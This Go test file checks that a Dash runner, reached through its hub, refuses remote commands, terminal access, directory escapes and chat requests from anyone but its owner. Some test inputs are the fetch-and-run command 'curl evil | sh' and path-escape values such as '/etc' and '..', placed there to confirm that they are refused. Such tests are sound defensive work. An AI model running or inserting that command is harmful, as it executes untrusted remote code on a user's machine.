package api

import (
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/websocket"

	"github.com/klahr/dash/internal/gitops"
	"github.com/klahr/dash/internal/hub"
	"github.com/klahr/dash/internal/model"
	"github.com/klahr/dash/internal/runner"
	"github.com/klahr/dash/internal/tunnel"
)

// runnerServer is a Dash running as a runner, as its hub reaches it.
func runnerServer(t *testing.T) (*Server, http.Handler, model.Project) {
	t.Helper()
	s, _, p := boardServer(t)
	s.ProjectRoot = t.TempDir()
	s.Git = gitops.New(nil)
	s.Procs = runner.NewManager(hub.New())
	t.Cleanup(s.Procs.StopAll)
	p, err := raw(s).UpdateProject(p.ID, func(p *model.Project) error {
		p.Path, p.TestCommand = t.TempDir(), "go test ./..."
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return s, s.RunnerRoutes(), p
}

func hubCall(h http.Handler, method, path, body string) *httptest.ResponseRecorder {
	r := httptest.NewRequest(method, path, strings.NewReader(body))
	if body != "" {
		r.Header.Set("Content-Type", "application/json")
	}
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)
	return w
}

func TestRunnerOffersTheHubOnlyItsProjects(t *testing.T) {
	_, h, p := runnerServer(t)
	if w := hubCall(h, "GET", "/api/projects", ""); w.Code != http.StatusOK {
		t.Fatalf("list projects (no login needed over the tunnel): %d %s", w.Code, w.Body)
	}
	if w := hubCall(h, "GET", "/api/projects/"+p.ID+"/todos", ""); w.Code != http.StatusOK {
		t.Fatalf("list todos: %d %s", w.Code, w.Body)
	}
	for _, c := range []struct{ method, path string }{
		{"GET", "/api/machines"},
		{"GET", "/peer/other/api/projects"},
		{"GET", "/api/connector"},
		{"POST", "/mcp/dash"},
		{"POST", "/mcp/permissions"},
		{"GET", "/"},
		{"GET", "/index.html"},
		{"POST", "/api/login"},
		{"GET", "/api/chat"},
		{"GET", "/api/runners"},
		{"GET", "/peer%2Fother/api/projects"},
	} {
		if w := hubCall(h, c.method, c.path, ""); w.Code != http.StatusForbidden && w.Code != http.StatusNotFound {
			t.Errorf("%s %s: %d, want refused", c.method, c.path, w.Code)
		}
	}
}

func TestRunnerRefusesCommandsFromTheHub(t *testing.T) {
	s, h, p := runnerServer(t)
	procs := "/api/projects/" + p.ID + "/processes"

	if w := hubCall(h, "POST", procs, `{"kind":"task","command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
		t.Fatalf("ad-hoc command: %d %s", w.Code, w.Body)
	}
	if w := hubCall(h, "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden {
		t.Fatalf("terminal: %d %s", w.Code, w.Body)
	}
	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"test_command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
		t.Fatalf("changing a command: %d %s", w.Code, w.Body)
	}
	if w := hubCall(h, "POST", "/api/projects", `{"name":"x","setup_command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
		t.Fatalf("new project with a command: %d %s", w.Code, w.Body)
	}
	if w := hubCall(h, "POST", "/api/projects", `{"name":"x","path":"/etc"}`); w.Code != http.StatusForbidden {
		t.Fatalf("adopting a directory outside the projects root: %d %s", w.Code, w.Body)
	}
	if w := hubCall(h, "POST", "/api/projects", `{"name":"x","path":"`+filepath.Join(s.ProjectRoot, "..", "escape")+`"}`); w.Code != http.StatusForbidden {
		t.Fatalf("adopting via ..: %d %s", w.Code, w.Body)
	}

	// The settings form sends every field: unchanged commands pass.
	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"name":"renamed","test_command":"go test ./...","run_command":""}`); w.Code != http.StatusOK {
		t.Fatalf("saving settings with the commands unchanged: %d %s", w.Code, w.Body)
	}

	// Terminals started on the runner itself stay there.
	pty, err := s.Procs.StartPTY(p.ID, p.Path, "sleep 30", 80, 24)
	if err != nil {
		t.Fatal(err)
	}
	if w := hubCall(h, "GET", "/ws/proc/"+pty.ID, ""); w.Code != http.StatusForbidden {
		t.Fatalf("attaching to a terminal: %d %s", w.Code, w.Body)
	}

	// With -hub-commands the hub may.
	s.HubCommands = true
	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"test_command":"make test"}`); w.Code != http.StatusOK {
		t.Fatalf("-hub-commands: %d %s", w.Code, w.Body)
	}
}

func TestRunnerSkipsThePasswordTheHubAlreadyAsked(t *testing.T) {
	// A missing project is reported after the password check: 404 means
	// the check passed, 403 that it wanted a password.
	_, h, _ := runnerServer(t)
	if w := hubCall(h, "DELETE", "/api/projects/nope", `{}`); w.Code != http.StatusNotFound {
		t.Fatalf("delete from the hub: %d %s", w.Code, w.Body)
	}
	s, _, _ := boardServer(t)
	w := httptest.NewRecorder()
	s.deleteProject(w, asOwner(t, s, httptest.NewRequest("DELETE", "/api/projects/nope", strings.NewReader(`{}`))))
	if w.Code != http.StatusForbidden {
		t.Fatalf("local delete without password: %d %s", w.Code, w.Body)
	}
}

// A runner runs the general chat only for its owner, asked through the
// hub: never for anyone else, nor when the hub doesn't say whom it is for.
// It runs in the runner's scratch directory, and the hub keeps the
// conversation.
func TestRunnerRunsTheGeneralChatOnlyForItsOwner(t *testing.T) {
	s, h, _ := runnerServer(t)
	s.HubUser = 42
	s.ChatDir = filepath.Join(t.TempDir(), "chat")
	chat := &echoChat{}
	s.Chat = chat
	srv := httptest.NewServer(h)
	defer srv.Close()
	ask := func(user string) (kinds []string, text string) {
		hdr := http.Header{}
		if user != "" {
			hdr.Set(tunnel.UserHeader, user)
		}
		ws, _, err := websocket.DefaultDialer.Dial("ws"+strings.TrimPrefix(srv.URL, "http")+"/ws/chat", hdr)
		if err != nil {
			t.Fatal(err)
		}
		defer ws.Close()
		if err := ws.WriteJSON(map[string]any{"type": "send", "messages": []map[string]string{{"role": "user", "content": "run ls ~"}}}); err != nil {
			t.Fatal(err)
		}
		_ = ws.SetReadDeadline(time.Now().Add(5 * time.Second))
		for {
			var d struct{ Kind, Text string }
			if err := ws.ReadJSON(&d); err != nil {
				t.Fatal(err)
			}
			kinds, text = append(kinds, d.Kind), text+d.Text
			if d.Kind == "done" || d.Kind == "error" {
				return kinds, text
			}
		}
	}
	for _, user := range []string{"", "7"} {
		if kinds, text := ask(user); kinds[len(kinds)-1] != "error" || !strings.Contains(text, "owner") && !strings.Contains(text, "registered it") {
			t.Fatalf("general chat for user %q: %v %q", user, kinds, text)
		}
	}
	if chat.calls.Load() != 0 {
		t.Fatal("Claude ran for someone other than the runner's owner")
	}
	if kinds, text := ask("42"); kinds[len(kinds)-1] != "done" || text != "hi" {
		t.Fatalf("owner's general chat: %v %q", kinds, text)
	}
	if got := chat.dir(); got != s.ChatDir {
		t.Errorf("ran in %q, want the scratch dir %q", got, s.ChatDir)
	}
	if got := raw(s).Chat(ownerCaller(t, s).Org, ownerCaller(t, s).User); len(got) != 0 {
		t.Errorf("the runner saved the hub's conversation: %+v", got)
	}
}
